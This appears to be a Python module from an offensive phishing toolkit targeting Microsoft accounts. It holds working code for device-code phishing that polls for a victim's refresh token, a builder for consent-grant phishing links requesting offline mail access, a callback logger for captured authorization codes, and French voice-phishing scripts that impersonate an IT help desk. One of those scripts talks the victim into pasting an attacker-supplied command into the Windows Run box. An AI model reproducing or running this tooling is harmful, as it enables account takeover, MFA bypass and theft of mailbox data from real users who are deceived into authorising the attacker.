# language: Python 3.11+, file: cf/access.py
# *initial access — oauth device code, consent grant, vishing pretexts*
from __future__ import annotations

from typing import Any

from .http import get_client
from .util import json_dumps

LOGIN = "https://login.microsoftonline.com"
DEFAULT_SCOPES = "offline_access openid profile User.Read Mail.Read"
DEVICE_GRANT = "urn:ietf:params:oauth:grant-type:device_code"

# aadsts codes seen on the device-code / ropc endpoints
AADSTS: dict[str, str] = {
    "50126": "invalid_credentials",
    "50034": "user_not_found",
    "50053": "smart_lockout",
    "50055": "password_expired",
    "50057": "account_disabled",
    "7000218": "invalid_scope_or_client",
    "7000222": "expired_device_code",
    "authorization_pending": "authorization_pending",
    "slow_down": "slow_down",
    "invalid_grant": "invalid_grant",
}


class AccessError(RuntimeError):
    """Network, tenant or app-registration problem — operator actionable."""


def classify(body: Any) -> str:
    """Map an AADSTS payload to a short, greppable reason."""
    text = body if isinstance(body, str) else json_dumps(body or {})
    for needle, label in AADSTS.items():
        if needle in text:
            return label
    return "unknown"


class DeviceCodeFlow:
    """T1528 — the victim types our code on microsoft.com and we keep the
    refresh token. No page to host, no MFA prompt to beat."""

    def __init__(
        self,
        client_id: str,
        tenant: str = "common",
        scopes: str = DEFAULT_SCOPES,
    ) -> None:
        if not client_id:
            raise AccessError("client-id is required (app registration, public client)")
        self.client_id = client_id
        self.tenant = tenant or "common"
        self.scopes = scopes or DEFAULT_SCOPES

    @property
    def device_url(self) -> str:
        return f"{LOGIN}/{self.tenant}/oauth2/v2.0/devicecode"

    @property
    def token_url(self) -> str:
        return f"{LOGIN}/{self.tenant}/oauth2/v2.0/token"

    async def start(self) -> dict[str, Any]:
        client = get_client()
        res = await client.post(
            self.device_url,
            data={"client_id": self.client_id, "scope": self.scopes},
            expect_json=True,
            retries=1,
        )
        body = res.get("body")
        if res.get("status") != 200 or not isinstance(body, dict):
            raise AccessError(
                f"device code request failed ({res.get('status')}): "
                f"{classify(body) if body else res.get('error')}"
            )
        if "user_code" not in body:
            raise AccessError(f"unexpected device code response: {body}")
        return body

    async def poll(
        self,
        device_code: str,
        *,
        interval: float = 5.0,
        timeout: float = 900.0,
    ) -> dict[str, Any]:
        """Blocks until the victim authorises, the code expires, or timeout."""
        import asyncio
        import time

        client = get_client()
        deadline = time.monotonic() + timeout
        wait = max(interval, 1.0)
        while time.monotonic() < deadline:
            await asyncio.sleep(wait)
            res = await client.post(
                self.token_url,
                data={
                    "grant_type": DEVICE_GRANT,
                    "client_id": self.client_id,
                    "device_code": device_code,
                },
                expect_json=True,
                retries=0,
            )
            body = res.get("body")
            if (
                res.get("status") == 200
                and isinstance(body, dict)
                and ("access_token" in body or "refresh_token" in body)
            ):
                return body
            reason = classify(body)
            if reason == "slow_down":
                wait = min(wait + 5.0, 30.0)
            elif reason in ("expired_device_code", "invalid_grant"):
                raise AccessError(f"device code unusable: {reason}")
            elif reason not in ("authorization_pending", "unknown"):
                raise AccessError(f"device code poll failed: {reason}")
        raise AccessError("device code timed out — victim never authorised")

    async def run(self, *, timeout: float = 900.0) -> dict[str, Any]:
        info = await self.start()
        tokens = await self.poll(
            str(info["device_code"]),
            interval=float(info.get("interval", 5)),
            timeout=timeout,
        )
        return {**info, "tokens": tokens}


def authorize_url(
    client_id: str,
    *,
    tenant: str = "common",
    redirect_uri: str = "https://HOST/oauth/cf",
    scopes: str = DEFAULT_SCOPES,
    state: str = "",
) -> str:
    """T1550.001 — consent-grant phishing: the victim only sees a real
    microsoft login that asks for offline_access on our app."""
    from urllib.parse import urlencode

    if not client_id:
        raise AccessError("client-id is required")
    params = {
        "client_id": client_id,
        "response_type": "code",
        "redirect_uri": redirect_uri,
        "response_mode": "query",
        "scope": scopes,
        "state": state or "cf",
    }
    return f"{LOGIN}/{tenant or 'common'}/oauth2/v2.0/authorize?{urlencode(params)}"


def parse_callback(query: dict[str, Any]) -> dict[str, str]:
    """Everything the /oauth/cf landing route needs to log."""
    out = {
        "code": str(query.get("code", "")),
        "state": str(query.get("state", "")),
        "error": str(query.get("error", "")),
        "error_description": str(query.get("error_description", ""))[:300],
    }
    return out


SCRIPTS: dict[str, tuple[str, ...]] = {
    "device_code": (
        "Bonjour, ici {org}, le service informatique.",
        "On a bloqué votre session {ticket} : rendez-vous sur microsoft.com/device.",
        "Entrez le code d'appareil que je vous envoie, puis validez la fenêtre.",
        "Restez en ligne deux minutes, je vérifie que ça remonte.",
    ),
    "mfa": (
        "Bonjour, ici {org} — on pousse une nouvelle méthode MFA.",
        "J'ai envoyé une demande d'approbation sur votre téléphone.",
        "Appuyez simplement sur {code} puis confirmez.",
        "Si rien ne s'affiche, je renvoie la demande.",
    ),
    "support": (
        "Bonjour, ici {org}, ticket {ticket} — diagnostic rapide.",
        "Ouvrez la fenêtre d'exécution avec la touche Windows + R.",
        "Collez la commande que je vous ai mise dans {channel} et appuyez sur Entrée.",
        "Je reste au ligne pour voir si le service revient.",
    ),
}


def vishing_script(
    kind: str = "device_code",
    *,
    org: str = "IT Service Desk",
    ticket: str = "4821",
    code: str = "",
    channel: str = "e-mail",
) -> tuple[str, ...]:
    lines = SCRIPTS.get(kind)
    if lines is None:
        raise AccessError(f"unknown vishing script: {kind}")
    return tuple(
        line.format(org=org, ticket=ticket, code=code or "XXXX", channel=channel)
        for line in lines
    )
